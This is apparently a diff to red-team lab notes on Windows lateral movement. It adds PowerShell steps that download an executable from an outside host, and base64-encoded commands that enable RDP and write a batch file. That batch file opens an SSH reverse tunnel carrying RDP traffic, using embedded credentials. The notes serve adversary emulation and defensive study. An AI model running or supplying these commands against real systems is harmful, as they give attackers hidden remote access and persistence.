@@ -47,15 +47,33 @@ lsass.exe                      652 Services                   0     16,848 K
 
 ### - Part 2: Lateral Movement
 
-#### a. Download ekern.exe `powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2:9000/file.exe', 'C:\windows\temp\ekern.exe')`
-#### b. Check if RDP is Enabled? `Get-Service -Name TermService`
+#### a. Download ekern.exe 
+```
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2:9000/file.exe', 'C:\windows\temp\ekern.exe')
+```
+
+#### b. Check if RDP is Enabled?
+```
+Get-Service -Name TermService
+```
+
 #### c. Enable RDP using the Encoded Command
 ```
 powershel.exe -Command "& {[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LVNlcnZpY2UgLU5hbWUgVGVybVNlcnZpY2UgLVN0YXJ0dXBUeXBlIEF1dG9tYXRpYw0KDQpTdGFydC1TZXJ2aWNlIC1OYW1lIFRlcm1TZXJ2aWNlDQoNClNldC1JdGVtUHJvcGVydHkgLVBhdGggJ0hLTE06XFN5c3RlbVxDdXJyZW50Q29udHJvbFNldFxDb250cm9sXFRlcm1pbmFsIFNlcnZlclwnIC1OYW1lICdmRGVueVRTQ29ubmVjdGlvbnMnIC1WYWx1ZSAw')) | Invoke-Expression}"
 ```
-#### d. `Get-Service -Name TermService`
+
+#### d. Check Again 
+```
+Get-Service -Name TermService
+```
 #### e. Write the FXS.bat
 ```
-powershel.exe -Command "& {[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGJhdGNoQ29udGVudCA9ICdlY2hvIHl8QzpcV2luZG93c1xUZW1wXGVrZXJuLmV4ZSAtc3NoIC1QIDQ0MyAtbCBIQGNrM3IgLXB3IENAbnRfRDNmM25kXzIwMjEtNDQwNzcgLVIgMTI3LjAuMC4xOjQ5ODAwOjE5Mi4xNjguMjAuMTQ1OjMzODkgMTkyLjE2OC4xLjInDQokYmF0Y2hGaWxlUGF0aCA9ICdDOlxVc2Vyc1xWaWN0aW1cRG9jdW1lbnRzXEZYUy5iYXQnDQpTZXQtQ29udGVudCAtUGF0aCAkYmF0Y2hGaWxlUGF0aCAtVmFsdWUgJGJhdGNoQ29udGVudA==')) | Invoke-Expression}"
+powershel.exe -Command "& {[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGJhdGNoQ29udGVudCA9ICdlY2hvIHl8QzpcV2luZG93c1xUZW1wXGVrZXJuLmV4ZSAtc3NoIC1QIDQ0MyAtbCB2MWN0aW0gLXB3IENAbnRfRDNmM25kIC1SIDEyNy4wLjAuMTo0OTgwMDoxOTIuMTY4LjIwLjE0NzozMzg5IDE5Mi4xNjguMS4yJw0KJGJhdGNoRmlsZVBhdGggPSAnQzpcVXNlcnNcVmljdGltXERvY3VtZW50c1xGWFMuYmF0Jw0KU2V0LUNvbnRlbnQgLVBhdGggJGJhdGNoRmlsZVBhdGggLVZhbHVlICRiYXRjaENvbnRlbnQ=')) | Invoke-Expression}"
 ```
-  
+
+#### f. Execute FXS.bat == Establish SSH Connection
+```
+powershell.exe C:\Users\Victim\Documents\FXS.bat
+```
+#### g. Let's Start The RDP, when doing the RDP we will be Making 3 attemps (Success) 
+
